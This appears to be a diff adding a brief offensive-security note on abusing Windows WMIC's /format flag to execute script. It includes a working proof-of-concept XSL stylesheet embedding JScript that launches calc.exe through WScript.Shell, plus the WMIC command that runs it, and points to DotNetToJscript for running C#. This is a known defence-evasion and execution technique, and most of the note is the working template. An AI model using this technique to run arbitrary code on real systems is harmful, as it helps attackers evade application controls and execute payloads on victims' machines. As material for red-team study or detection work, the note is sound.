@@ -1,0 +1,41 @@
+# WMIC
+
+## WMIC
+
+Windows Management Instrumentation Command-Line
+
+* /format flag = formt wmic output \(wmic process get /format:list\)
+* Use "&lt;!\[CDATA\[" payload \(ie msbuild.exe link\)
+* Can be used with XSL file \(CSS style sheet for XML file\)
+* Support JScript, VBscript and custom C\# language \(using DotNetToJscript\)
+
+\(see DotNetToJscript\)
+
+### Poc
+
+* **Calc.xsl**
+
+```text
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:vb="urn:the-xml-files:xslt-vb" xmlns:user="placeholder" version="1.0">
+<!-- Copyright (c) Microsoft Corporation.  All rights reserved. -->
+
+<xsl:output method="text" omit-xml-declaration="yes" indent="no"/>
+<xsl:strip-space elements="*" />
+
+<ms:script implements-prefix="user" language="JScript">
+<![CDATA[
+
+        var r = new ActiveXObject("WScript.Shell").Run("calc.exe")
+
+  ]]></ms:script>
+<xsl:template match="/"><xsl:apply-templates select="//RESULTS"/><xsl:apply-templates select="//INSTANCE"/><xsl:value-of select="user:DisplayValues(.)"/></xsl:template>
+<xsl:template match="RESULTS"><xsl:value-of select="user:CountResults(.)"/></xsl:template>
+<xsl:template match="INSTANCE"><xsl:value-of select="user:GotInstance()"/><xsl:apply-templates select="PROPERTY|PROPERTY.ARRAY|PROPERTY.REFERENCE"/></xsl:template>
+<xsl:template match="PROPERTY|PROPERTY.ARRAY|PROPERTY.REFERENCE"><xsl:value-of select="user:GetValues(.)"/></xsl:template>
+</xsl:stylesheet>
+```
+
+* Execute the file file
+
+`wmic process get /format:"calc.xsl"`
+
